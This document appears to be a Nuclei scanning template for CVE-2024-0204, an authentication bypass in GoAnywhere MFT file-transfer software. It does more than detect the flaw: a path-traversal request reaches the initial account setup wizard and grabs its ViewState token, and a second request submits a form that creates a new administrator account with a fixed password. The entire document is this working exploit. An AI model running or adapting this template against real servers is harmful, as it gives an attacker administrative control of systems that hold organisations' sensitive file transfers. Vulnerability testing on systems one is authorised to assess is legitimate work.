id: CVE-2024-0204-auth-bypass

info:
  name: GoAnywhere MFT Authentication Bypass
  author: 3p1c0w3nd
  severity: critical
  tags: auth-bypass,cve,goanywhere

requests:
  - raw:
      - |
        GET /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "javax.faces.ViewState"

    extractors:
      - type: regex
        regex:
          - "javax.faces.ViewState\" value=\"([^\"]+)"

  - raw:
      - |
        POST /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        j_id_u:creteAdminGrid:username=newadmin&j_id_u:creteAdminGrid:password_hinput=Admin123!&j_id_u:creteAdminGrid:confirmPassword_hinput=Admin123!&javax.faces.ViewState={{ViewState}}&createAdminForm_SUBMIT=1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "Admin user created"
